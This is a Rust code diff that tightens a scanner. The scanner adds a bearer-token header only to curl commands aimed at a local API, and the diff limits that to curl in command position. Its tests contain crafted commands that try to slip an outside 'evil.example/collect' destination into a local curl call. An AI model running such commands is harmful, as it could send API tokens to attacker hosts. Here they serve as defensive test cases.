@@ -453,11 +453,13 @@ fn targets_local_api(segment: &str) -> bool {
     destinations > 0
 }
 
-/// Byte offsets just past each `curl`/`curl.exe` executable token in a line
-/// that sits outside quotes. `quote` carries the open-quote state across the
-/// continuation lines of one command block, so `-H "X: curl value"` is an
-/// argument, not a second invocation.
-fn curl_executable_ends(line: &str, quote: &mut Option<u8>) -> Vec<usize> {
+/// Byte offsets just past each `curl`/`curl.exe` executable in a line. A word
+/// counts only in *command position*: at the start of the block or right after
+/// a shell separator (`|`, `;`, `&`, `(`, `{`, a backtick), never as an
+/// argument (`-o curl` is an option value), and never inside quotes. `quote`
+/// and `at_command` carry the shell state across the continuation lines of
+/// one command block.
+fn curl_executable_ends(line: &str, quote: &mut Option<u8>, at_command: &mut bool) -> Vec<usize> {
     let bytes = line.as_bytes();
     let mut ends = Vec::new();
     let mut index = 0;
@@ -473,32 +475,45 @@ fn curl_executable_ends(line: &str, quote: &mut Option<u8>) -> Vec<usize> {
             continue;
         }
         match byte {
+            b' ' | b'\t' | b'\r' => {
+                index += 1;
+                continue;
+            }
+            b'|' | b';' | b'&' | b'(' | b'{' | b'`' => {
+                *at_command = true;
+                index += 1;
+                continue;
+            }
             b'\'' | b'"' => {
+                *at_command = false;
                 *quote = Some(byte);
                 index += 1;
                 continue;
             }
             b'\\' => {
+                // `\` at the end of a line is a continuation, not a word.
+                if index + 1 < bytes.len() {
+                    *at_command = false;
+                }
                 index += 2;
                 continue;
             }
             _ => {}
         }
         // Byte comparisons: `index` may sit inside a multi-byte character.
-        if bytes[index..].starts_with(b"curl") {
+        if *at_command && bytes[index..].starts_with(b"curl") {
             let mut end = index + 4;
             if bytes[end..].starts_with(b".exe") {
                 end += 4;
             }
-            let boundary_before = index == 0
-                || matches!(bytes[index - 1], b' ' | b'\t' | b'|' | b'(' | b'`' | b';' | b'&');
-            let boundary_after = bytes.get(end).is_some_and(|byte| *byte == b' ');
-            if boundary_before && boundary_after {
+            if bytes.get(end).is_some_and(|byte| *byte == b' ') {
                 ends.push(end);
+                *at_command = false;
                 index = end;
                 continue;
             }
         }
+        *at_command = false;
         index += 1;
     }
     ends
@@ -522,9 +537,10 @@ pub fn authorize_api_commands(content: &str) -> String {
         // extend a block.
         let mut end = index;
         let mut quote = None;
+        let mut at_command = true;
         let mut invocations: Vec<(usize, usize)> = Vec::new();
         loop {
-            for position in curl_executable_ends(&lines[end], &mut quote) {
+            for position in curl_executable_ends(&lines[end], &mut quote, &mut at_command) {
                 invocations.push((end, position));
             }
             let continues = lines[end].trim_end().ends_with('\\')
@@ -801,8 +817,11 @@ curl -s https://example.com/a \\\n  -o out && curl -s \\\n  http://127.0.0.1:188
         ] {
             assert_eq!(authorize_api_commands(source), source, "{source}");
         }
-        // Multi-byte text before a curl must not panic the scanner.
-        let rendered = authorize_api_commands("Spawned — curl -s http://localhost:18800/api/x");
+        // Multi-byte text must not panic the scanner; prose is not a command.
+        let prose = "Spawned — curl -s http://localhost:18800/api/x";
+        assert_eq!(authorize_api_commands(prose), prose);
+        let rendered = authorize_api_commands("— marker
+curl -s http://localhost:18800/api/x");
         assert!(rendered.contains("Bearer $HIVE_API_TOKEN"), "{rendered}");
         let rendered = authorize_api_commands(
             "curl -H \"X: curl value\" http://localhost:18800/api/sessions",
@@ -839,6 +858,27 @@ curl -s https://example.com/a \\\n  -o out && curl -s \\\n  http://127.0.0.1:188
         // Prose apostrophes before any curl do not swallow later lines.
         let prose = "Don't forget:\ncurl -s http://localhost:18800/api/x";
         assert!(authorize_api_commands(prose).contains("curl -H \"Authorization"));
+    }
+
+    #[test]
+    fn only_a_curl_in_command_position_starts_an_invocation() {
+        for source in [
+            "curl -s http://localhost:18800/api/sessions -o curl https://evil.example/collect",
+            "curl -s http://localhost:18800/api/sessions -o curl \\\n  https://evil.example/collect",
+            "EXTRA_URLS=' https://example.com/collect'\ncurl http://localhost:18800/api/sessions${EXTRA_URLS}",
+        ] {
+            assert_eq!(authorize_api_commands(source), source, "{source}");
+        }
+        // Command positions after separators still count.
+        let header = "-H \"Authorization: Bearer $HIVE_API_TOKEN\"";
+        for (source, expected) in [
+            ("x=$(curl -s http://localhost:18800/api/a)", 1),
+            ("cat <<'JSON' | curl -s http://localhost:18800/api/a --data-binary @-", 1),
+            ("true && curl -s http://localhost:18800/api/a; curl -s http://localhost:18800/api/b", 2),
+            ("   curl -s http://localhost:18800/api/a", 1),
+        ] {
+            assert_eq!(authorize_api_commands(source).matches(header).count(), expected, "{source}");
+        }
     }
 
     #[test]
